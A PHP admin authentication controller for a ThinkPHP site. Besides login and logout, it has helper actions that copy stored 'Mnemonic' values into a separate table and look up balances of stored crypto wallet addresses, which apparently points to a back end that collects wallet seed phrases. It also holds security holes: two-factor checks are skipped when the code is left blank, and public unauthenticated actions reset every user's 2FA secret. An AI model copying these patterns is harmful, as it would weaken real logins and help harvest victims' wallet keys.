<?php

namespace app\admin\controller;

use app\common\consts\Response;
use app\common\model\Mnemonics;
use app\common\model\User;
use app\common\service\GoogleAuthenticator;
use app\common\service\LogService;
use think\Controller;
use think\Exception;
use think\Loader;
use think\Request;
use think\facade\Session;
use think\db;

class Auth extends Controller
{
    
    public function zs_bd(){
        include_once '../extend/GoogleAuthenticator/PHPGangsta/GoogleAuthenticator.php';
        // var_dump('123');die;
        $obj = new \PHPGangsta_GoogleAuthenticator();
        //在这里生成秘钥，如果使用用户输入秘钥的关联方式，就将这段秘钥展示给用户
        $sec = $obj->createSecret();
        echo $sec;
        //如果使用扫码的方式进行关联，就可以使用下面的方法来生成二维码展示给用户
        $url = $obj->getQRCodeGoogleUrl('liangcs2', $sec);

    }


    public function index()
    {   
        if(Session::has('admin'))
            $this -> redirect('Index/index');
        $identity = $_GET['identity'];
        $this->assign('identity',$identity);
        return $this->fetch();
    }


    public function login(Request $request)
    {
        if (! $request->isPost())
            $this -> redirect('Index/index');
            
            
            $yzm = $request->yzm;
            
            $username = $request->username;
            
            if(!empty($yzm)){
                            $miyue_data = Db::name('miyue') -> find();
                $miyue = $miyue_data['miyue'];
    
                
                include_once '../extend/GoogleAuthenticator/PHPGangsta/GoogleAuthenticator.php';
                    $obj = new \PHPGangsta_GoogleAuthenticator();
                    $dyncCode = $yzm;
                    //对用户输入的6位动态码进行校验，参数$sec是与此用户关联的秘钥
                    $sec = $miyue;
                    $ret = $obj->verifyCode($sec, $dyncCode);
                    if(!$ret) {
                        // $this -> redirect('Index/index');
                        $this -> error('谷歌验证码错误');
                    }
            }else{
                if($username == 'admin'){
//                    $this -> error('非代理账号无法登陆');
                }
            }
            


       
        $user = User::where('email', trim($username))->where('is_delete', '=', 0)->find();
        if (! $user)
            $this -> redirect('Index/index');

        if(!verifyHashedPassword($request->password, $user->password)){
            $this -> redirect('Index/index');
        }


        $user->token = md5(md5(time(). 'auth_token'));
        $user->save();

        $sessionArray = array('userId'=>$user->userId,
            'role'=>$user->roleId,
            'token' => $user->token,
            'is_withdraw' => $user->is_withdraw
        );
        session('admin', $sessionArray);
        
        
        return $this -> redirect('admin/index/index');
    }


    public function logout(Request $request)
    {
        session('admin', null);
        $this -> redirect('Auth/index');
    }

    public function test()
    {
        $model = new \app\common\model\Casies();

        $data = $model->field('Mnemonic')->group('Mnemonic')->column('Mnemonic');

        foreach ($data as $v) {
            try {
                $mnemonics = new Mnemonics();
                $mnemonics->save(['Mnemonic' => $v]);
            } catch (Exception $e) {

            }
        }
        echo 'ok';
    }

    public function init_secret()
    {
        $data = User::select();
        $google = new GoogleAuthenticator();

        foreach ($data as $v) {
            User::update(['secret' => $google->createSecret()], ['id' => $v['id']]);
        }

        echo  'ok';
    }

    public function update_balance()
    {
        $data = \app\common\model\Abouts::field('address, type, update_time')
            ->order('update_time', 'asc')
            ->limit(30)
            ->select();


        foreach ($data as $v) {
            try {
                \app\common\model\Abouts::update(['balance' => 0,'update_time' => date('Y-m-d H:i:s')], ['address' => $v['address']]);
                $balance = \app\common\service\Api::getBalance($v['type'], $v['address']);

                if ($balance == false) {
                    continue;
                }

                \app\common\model\Abouts::update(['balance' => $balance], ['address' => $v['address']]);
            } catch (Exception $e) {
                dump($e->getMessage());
                dump($balance);
                echo PHP_EOL;
            }
        }
        echo 'ok';
    }

}
